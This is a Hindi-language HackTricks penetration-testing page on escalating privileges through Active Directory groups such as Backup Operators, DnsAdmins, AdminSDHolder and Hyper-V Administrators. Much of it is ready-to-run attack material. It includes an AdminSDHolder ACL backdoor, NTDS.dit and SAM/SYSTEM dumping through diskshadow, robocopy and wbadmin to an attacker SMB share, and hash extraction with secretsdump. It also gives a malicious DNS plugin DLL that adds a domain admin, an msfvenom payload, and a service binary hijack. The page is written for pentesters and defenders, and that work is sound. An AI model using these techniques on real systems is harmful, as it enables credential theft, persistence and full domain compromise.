# विशेषाधिकार वाले समूह

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## प्रशासनिक विशेषाधिकार वाले ज्ञात समूह

* **प्रशासक**
* **डोमेन व्यवस्थापक**
* **एंटरप्राइज व्यवस्थापक**

सुरक्षा मूल्यांकन के दौरान एकाधिक हमला वेक्टर चेन करते समय अन्य खाता सदस्यता और पहुँच टोकन विशेषाधिकार भी उपयोगी हो सकते हैं।

## खाता ऑपरेटर्स <a href="#account-operators" id="account-operators"></a>

* डोमेन पर गैर प्रशासक खाते और समूह बनाने की अनुमति देता है
* DC में स्थानीय रूप से लॉग इन करने की अनुमति देता है

समूह के **सदस्य** प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
नोट करें स्पॉटलेस उपयोगकर्ता सदस्यता:

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

हालांकि, हम अभी भी नए उपयोगकर्ता जोड़ सकते हैं:

![](../../.gitbook/assets/a2.png)

साथ ही, DC01 में स्थानीय रूप से लॉगिन कर सकते हैं:

![](../../.gitbook/assets/a3.png)

## AdminSDHolder समूह

**AdminSDHolder** ऑब्जेक्ट की एक्सेस कंट्रोल सूची (ACL) का उपयोग Active Directory में सभी "संरक्षित समूहों" को **अनुमतियों** की **प्रतिलिपि** करने के लिए किया जाता है। संरक्षित समूहों में विशेषाधिकारी समूह शामिल हैं जैसे कि डोमेन व्यवस्थापक, प्रशासक, एंटरप्राइज व्यवस्थापक और स्कीमा व्यवस्थापक।\
डिफ़ॉल्ट रूप से, इस समूह की ACL सभी "संरक्षित समूहों" के अंदर कॉपी की जाती है। इसका उद्देश्य यह है कि इन महत्वपूर्ण समूहों में इच्छित या अकस्मात बदलाव से बचा जा सके। हालांकि, यदि कोई हमलावर उदाहरण के लिए समूह **AdminSDHolder** की ACL को संशोधित करता है और एक साधारण उपयोगकर्ता को पूर्ण अनुमतियाँ देता है, तो इस उपयोगकर्ता को संरक्षित समूह के अंदर सभी समूहों पर पूर्ण अनुमतियाँ होंगी (एक घंटे में)।\
और यदि कोई इस उपयोगकर्ता को डोमेन व्यवस्थापकों से हटाने की कोशिश करता है (उदाहरण के लिए) एक घंटे या उससे कम समय में, तो उपयोगकर्ता समूह में वापस आ जाएगा।

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
**AdminSDHolder** समूह में एक उपयोगकर्ता जोड़ें:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
जांचें कि क्या उपयोगकर्ता **Domain Admins** समूह में है:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
यदि आप एक घंटे तक प्रतीक्षा नहीं करना चाहते हैं, तो आप एक PS स्क्रिप्ट का उपयोग करके तत्काल पुनर्स्थापना कर सकते हैं: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**अधिक जानकारी ired.team में।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD Recycle Bin**

यह समूह आपको हटाए गए AD ऑब्जेक्ट को पढ़ने की अनुमति देता है। वहां कुछ रोचक जानकारी मिल सकती है:
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### डोमेन कंट्रोलर एक्सेस

ध्यान दें कि हम वर्तमान सदस्यता के साथ डीसी पर फ़ाइलों तक पहुंच नहीं कर सकते हैं:

![](../../.gitbook/assets/a4.png)

हालांकि, यदि उपयोगकर्ता `सर्वर ऑपरेटर्स` में शामिल है:

![](../../.gitbook/assets/a5.png)

कहानी बदल जाती है:

![](../../.gitbook/assets/a6.png)

### Privesc <a href="#backup-operators" id="backup-operators"></a>

सेवा पर अनुमतियों की जांच करने के लिए [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) या `sc`, सिसइंटरनल्स से, का उपयोग करें।
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
यह सत्यापित करता है कि Server Operators समूह में [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) एक्सेस राइट है, जो हमें इस सेवा पर पूर्ण नियंत्रण प्रदान करता है।\
आप इस सेवा का दुरुपयोग करके इस सेवा को अभिमानी आदेशों को निष्पादित करने के लिए और प्रभावी अधिकारों को बढ़ाने के लिए कर सकते हैं।

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

`Server Operators` सदस्यता की तरह, हम `Backup Operators` में शामिल होने पर **`DC01` फ़ाइल सिस्टम तक पहुंच** कर सकते हैं।

इसलिए इस समूह अपने सदस्यों को [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) और [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) विशेषाधिकार प्रदान करता है। **SeBackupPrivilege** हमें किसी भी फ़ोल्डर को ट्रावर्स करने और फ़ोल्डर की सामग्री की सूची बनाने की अनुमति देता है। इससे हमें किसी फ़ोल्डर से एक फ़ाइल की प्रतिलिपि बनाने की अनुमति मिलेगी, यदि कुछ और आपको अनुमति नहीं दे रहा है। हालांकि, एक फ़ाइल की प्रतिलिपि बनाने के लिए इस अनुमति का दुरुपयोग करने के लिए झंडा [**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) का उपयोग किया जाना चाहिए। इसलिए, विशेष उपकरणों की आवश्यकता होती है।

इस उद्देश्य के लिए आप [**ये स्क्रिप्ट**](https://github.com/giuliano108/SeBackupPrivilege) का उपयोग कर सकते हैं।

समूह के **सदस्य** प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **स्थानीय हमला**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD हमला

उदाहरण के लिए, आप सीधे डोमेन कंट्रोलर फ़ाइल सिस्टम तक पहुंच सकते हैं:

![](../../.gitbook/assets/a7.png)

आप इस पहुंच का दुरुपयोग करके एक्टिव डायरेक्टरी डेटाबेस **`NTDS.dit`** को चोरी कर सकते हैं और डोमेन में सभी उपयोगकर्ता और कंप्यूटर ऑब्जेक्ट्स के लिए सभी **NTLM हैश** प्राप्त कर सकते हैं।

#### NTDS.dit को डंप करने के लिए diskshadow.exe का उपयोग

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) का उपयोग करके आप **`C` ड्राइव** और उदाहरण के लिए `F` ड्राइव में **शैडो कॉपी बना सकते हैं**। फिर, आप इस शैडो कॉपी से `NTDS.dit` फ़ाइल चुरा सकते हैं क्योंकि यह सिस्टम द्वारा उपयोग में नहीं होगी:
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
जैसा कि स्थानीय हमले में, अब आप विशेषाधिकारित फ़ाइल **`NTDS.dit`** की प्रतिलिपि बना सकते हैं:
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
फ़ाइलें कॉपी करने का एक और तरीका है [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
तब आप आसानी से **SYSTEM** और **SAM** को **चुरा सकते हैं**:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
अंत में आप **`NTDS.dit`** से **सभी हैश** प्राप्त कर सकते हैं:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### NTDS.dit को डंप करने के लिए wbadmin.exe का उपयोग करें

wbadmin.exe का उपयोग करना diskshadow.exe के उपयोग के बहुत समान है, wbadmin.exe उपयोगीता एक कमांड लाइन उपयोगीता है जो Windows में बनी हुई है, Windows Vista/Server 2008 से पहले से ही।

इसका उपयोग करने से पहले, आपको अपनी हमलावर मशीन पर smb सर्वर के लिए ntfs फ़ाइल सिस्टम सेटअप करनी होगी।

जब आप smb सर्वर को सेटअप करने के लिए समाप्त कर चुके हों, तो आपको लक्षित मशीन पर smb क्रेडेंशियल को कैश करने की आवश्यकता होगी:
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
यदि कोई त्रुटि नहीं है, तो इसका उपयोग करें wbadmin.exe को इसका शोध करने के लिए:
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
यदि यह सफल होता है, तो यह `C:\ntds.dit` में डंप हो जाएगा।

[IPPSEC के साथ डेमो वीडियो](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

**DNSAdmins** समूह के सदस्य या **DNS** सर्वर ऑब्जेक्ट पर **लेखन अधिकार** रखने वाले उपयोगकर्ता **SYSTEM** अधिकारों के साथ एक **विचित्र DLL** लोड कर सकते हैं।\
यह बहुत दिलचस्प है क्योंकि **Domain Controllers** को अक्सर **DNS सर्वर** के रूप में उपयोग किया जाता है।

जैसा कि इस \*\*\*\* [**पोस्ट**](https://adsecurity.org/?p=4064) में दिखाया गया है, जब DNS एक डोमेन कंट्रोलर पर चलाया जाता है (जो बहुत सामान्य है), तो निम्नलिखित हमला किया जा सकता है:

* DNS प्रबंधन RPC के माध्यम से किया जाता है
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) हमें एक कस्टम **DLL** को **लोड** करने की अनुमति देता है, DLL के पथ की **कोई सत्यापन** नहीं की जाती है। इसे कमांड लाइन से `dnscmd` टूल के साथ किया जा सकता है
* जब **`DnsAdmins`** समूह का सदस्य **`dnscmd`** निम्नलिखित कमांड चलाता है, तो `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` रजिस्ट्री कुंजी पूरी होती है
* जब **DNS सेवा पुनः चालू** होती है, तो इस पथ में दिए गए **DLL** को **लोड** किया जाएगा (अर्थात्, एक नेटवर्क शेयर जिसमें डोमेन कंट्रोलर के मशीन खाते तक पहुंच हो सकती है)
* एक हमलावर एक **कस्टम DLL लोड करके एक रिवर्स शेल प्राप्त** कर सकता है या यहां तक कि क्रेडेंशियल्स डंप करने के लिए Mimikatz जैसा एक उपकरण भी लोड कर सकता है।

समूह के **सदस्य** प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### किसी भी DLL को निष्पादित करें

फिर, यदि आपके पास **DNSAdmins समूह** में एक उपयोगकर्ता है, तो आप **DNS सर्वर को SYSTEM विशेषाधिकारों के साथ किसी भी DLL को लोड करने** के लिए बना सकते हैं (DNS सेवा `NT AUTHORITY\SYSTEM` के रूप में चलती है)। आप DNS सर्वर को लोड करने के लिए एक **स्थानीय या दूरस्थ** (SMB द्वारा साझा किया गया) DLL फ़ाइल को निष्पादित कर सकते हैं:
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
एक मान्य DLL का उदाहरण [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) में मिल सकता है। मैं `DnsPluginInitialize` फ़ंक्शन के कोड को इस तरह से बदलना चाहूंगा:
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
या आप msfvenom का उपयोग करके एक DLL उत्पन्न कर सकते हैं:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
तो, जब **DNS सेवा** शुरू या पुनरारंभ होती है, एक नया उपयोगकर्ता बनाया जाएगा।

DNSAdmin समूह में एक उपयोगकर्ता होने के बावजूद आप **डीएनएस सेवा को रोकने और पुनरारंभ करने के लिए डिफ़ॉल्ट रूप से नहीं कर सकते हैं।** लेकिन आप हमेशा कोशिश कर सकते हैं:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**इस विशेषाधिकार वृद्धि के बारे में और अधिक जानें ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

इस [**पोस्ट**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) में विस्तार से बताया गया है कि `Mimikatz` उपकरण के निर्माता द्वारा [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) का उपयोग करके हम कमांड निष्पादन प्राप्त करने के लिए [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* फ़ाइल को **संशोधित** करके एक **रिवर्स शेल** वन-लाइनर या हमारी पसंद की अन्य कमांड को निष्पादित करना संभव है।

### MitM के लिए WPAD रिकॉर्ड

DnsAdmins समूह की विशेषाधिकार का दुरुपयोग करने का एक और तरीका है **WPAD रिकॉर्ड** बनाना। इस समूह में सदस्यता हमें [वैश्विक क्वेरी ब्लॉक सुरक्षा अक्षम करने](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) की अनुमति देती है, जो डिफ़ॉल्ट रूप से इस हमले को ब्लॉक करती है। सर्वर 2008 ने पहली बार एक DNS सर्वर पर एक वैश्विक क्वेरी ब्लॉक सूची में जोड़ने की क्षमता पेश की। डिफ़ॉल्ट रूप से, वेब प्रॉक्सी स्वचालित खोज प्रोटोकॉल (WPAD) और साइट-आंतरिक स्वचालित टनल पता प्रोटोकॉल (ISATAP) वैश्विक क्वेरी ब्लॉक सूची में होते हैं। ये प्रोटोकॉल हाइजैकिंग के लिए काफी संवेदनशील होते हैं, और कोई भी डोमेन उपयोगकर्ता उन नामों को समारोह विषयक या DNS रिकॉर्ड बना सकता है।

**वैश्विक क्वेरी ब्लॉक** सूची को अक्षम करने और **WPAD रिकॉर्ड** बनाने के बाद, **हर मशीन** जो डिफ़ॉल्ट सेटिंग्स के साथ WPAD चला रही है, अपना **ट्रैफ़िक हमारी हमला मशीन के माध्यम से प्रॉक्सी करेगी**। हम ट्रैफ़िक स्पूफ़िंग करने के लिए उपकरण जैसे \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **या** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **का उपयोग कर सकते हैं**, और पासवर्ड हैश को पकड़ने और ऑफ़लाइन में उन्हें क्रैक करने या एक SMBRelay हमला करने का प्रयास कर सकते हैं।

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## ईवेंट लॉग पाठक

[**ईवेंट लॉग पाठक**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* समूह के सदस्यों को **ईवेंट लॉग्स तक पहुंच की अनुमति** होती है (जैसे नई प्रक्रिया निर्माण लॉग्स)। लॉग्स में **संवेदनशील जानकारी** मिल सकती है। चलिए देखते हैं कि लॉग्स को दृश्यीकरण कैसे करें:
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## एक्सचेंज विंडोज़ अनुमतियाँ

सदस्यों को **डोमेन ऑब्जेक्ट पर एक डैकल लिखने** की क्षमता प्रदान की जाती है। एक हमलावर इसका दुरुपयोग करके एक उपयोगकर्ता को [**DCSync**](dcsync.md) विशेषाधिकार प्रदान कर सकता है।
यदि AD परिवेश में Microsoft Exchange स्थापित है, तो इस समूह के सदस्य के रूप में उपयोगकर्ता खाते और कंप्यूटरों को खोजना सामान्य है।

यह [**GitHub रेपो**](https://github.com/gdedrouas/Exchange-AD-Privesc) इस समूह की अनुमतियों का दुरुपयोग करके विशेषाधिकारों को बढ़ाने के कुछ **तकनीकों** की व्याख्या करता है।
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V प्रशासक

[**Hyper-V प्रशासक**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) समूह को सभी [Hyper-V सुविधाओं](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) का पूरा उपयोग करने की अनुमति होती है। यदि **डोमेन कंट्रोलर्स** को **वर्चुअलाइज़्ड** किया गया है, तो **वर्चुअलाइज़ेशन व्यवस्थापक** को **डोमेन एडमिन्स** के रूप में विचार किया जाना चाहिए। वे आसानी से **लाइव डोमेन कंट्रोलर की क्लोन बना सकते हैं** और वर्चुअल **डिस्क** को ऑफ़लाइन माउंट करके **`NTDS.dit`** फ़ाइल प्राप्त कर सकते हैं और डोमेन में सभी उपयोगकर्ताओं के NTLM पासवर्ड हैश निकाल सकते हैं।

इस [ब्लॉग](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) पर भी अच्छी तरह से दस्तावेज़ीकृत है कि एक वर्चुअल मशीन को **हटाने** पर, `vmms.exe` संबंधित **`.vhdx` फ़ाइल** पर मूल फ़ाइल अनुमतियों को **पुनर्स्थापित** करने का प्रयास करता है और यह `NT AUTHORITY\SYSTEM` के रूप में करता है, उपयोगकर्ता की अनुकरण करके नहीं। हम **`.vhdx`** फ़ाइल को **हटा सकते हैं** और इस फ़ाइल को एक सुरक्षित SYSTEM फ़ाइल के लिए एक प्राकृतिक **हार्ड लिंक** बनाने के लिए निम्नलिखित अनुमतियों को प्रदान कर सकते हैं, और आपको पूरी अनुमति मिलेगी।

यदि ऑपरेटिंग सिस्टम [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) या [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) के लिए संकटग्रस्त है, तो हम इसका उपयोग करके SYSTEM विशेषाधिकार प्राप्त कर सकते हैं। अन्यथा, हम कोशिश कर सकते हैं कि **सर्वर पर एक ऐसे एप्लिकेशन का लाभ उठाएं जिसने SYSTEM के संदर्भ में चलने वाली सेवा स्थापित की है**, जिसे अनधिकृत उपयोगकर्ता शुरू कर सकते हैं।

### **शोषण उदाहरण**

इसका एक उदाहरण है **Firefox**, जो **`Mozilla Maintenance Service`** स्थापित करता है। हम इस [एक्सप्लॉइट](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (NT हार्ड लिंक के लिए प्रमाण-उदाहरण) को अपडेट कर सकते हैं ताकि हमारे मौजूदा उपयोगकर्ता को निम्नलिखित फ़ाइल पर पूरी अनुमति मिले:
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **फ़ाइल के स्वामित्व को अधिकार में लेना**

PowerShell स्क्रिप्ट चलाने के बाद, हमें इस फ़ाइल के पूर्ण नियंत्रण होना चाहिए और हम इसके स्वामित्व को अधिकार में ले सकते हैं।
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **मोज़िला रखरखाव सेवा को शुरू करना**

अगले, हम इस फ़ाइल को एक **हानिकारक `maintenanceservice.exe`** के साथ बदल सकते हैं, मेंटेनेंस सेवा को **शुरू** कर सकते हैं, और SYSTEM के रूप में कमांड निष्पादन प्राप्त कर सकते हैं।
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
यह वेक्टर मार्च 2020 के विंडोज सुरक्षा अपडेट द्वारा न्यूनतम किया गया है, जो हार्ड लिंक्स से संबंधित व्यवहार को बदल देता है।
{% endhint %}

## संगठन प्रबंधन

इस समूह में भी **माइक्रोसॉफ्ट एक्सचेंज** स्थापित वातावरण होता है।\
इस समूह के सदस्य **सभी** डोमेन उपयोगकर्ताओं के **मेलबॉक्स** तक **पहुंच** प्राप्त कर सकते हैं।\
इस समूह को भी `Microsoft Exchange Security Groups` नामक OU का **पूर्ण नियंत्रण** होता है, जिसमें समूह [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) होता है \*\*\*\* (इस समूह का दुरुपयोग करके प्राइवेसी प्रशासन करने के लिए लिंक पर क्लिक करें)।

## प्रिंट ऑपरेटर्स

इस समूह के सदस्यों को निम्नलिखित प्राप्त होता है:

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **एक डोमेन कंट्रोलर पर स्थानीय रूप से लॉग ऑन करें** और उसे बंद करें
* एक डोमेन कंट्रोलर से जुड़े प्रिंटर्स को **प्रबंधित**, बनाएँ, साझा करें और हटाएँ करने की अनुमति

{% hint style="warning" %}
यदि अनउच्च विषयमें से `whoami /priv` कमांड ने **`SeLoadDriverPrivilege`** नहीं दिखाया है, तो आपको UAC को दौर करने की आवश्यकता है।
{% endhint %}

समूह के **सदस्य** प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
इस समूह के सदस्य PC पर RDP के माध्यम से पहुंच सकते हैं।\
समूह के **सदस्य** प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
आरडीपी के बारे में अधिक जानकारी:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## दूरस्थ प्रबंधन उपयोगकर्ता

इस समूह के सदस्य **WinRM** के माध्यम से PC तक पहुंच सकते हैं।
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
विनर्म के बारे में अधिक जानकारी:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## सर्वर ऑपरेटर <a href="#server-operators" id="server-operators"></a>

इस सदस्यता से उपयोगकर्ताओं को निम्नलिखित विशेषाधिकारों के साथ डोमेन कंट्रोलर को कॉन्फ़िगर करने की अनुमति होती है:

* स्थानीय रूप से लॉग ऑन करने की अनुमति
* फ़ाइल और निर्देशिकाओं का बैकअप करने की अनुमति
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) और [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* सिस्टम का समय बदलने की अनुमति
* समय क्षेत्र बदलने की अनुमति
* दूरस्थ सिस्टम से शटडाउन करने की अनुमति
* फ़ाइल और निर्देशिकाओं को बहाल करने की अनुमति
* सिस्टम को बंद करने की अनुमति
* स्थानीय सेवाओं को नियंत्रित करने की अनुमति

समूह के **सदस्य** प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## संदर्भ <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** हो? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
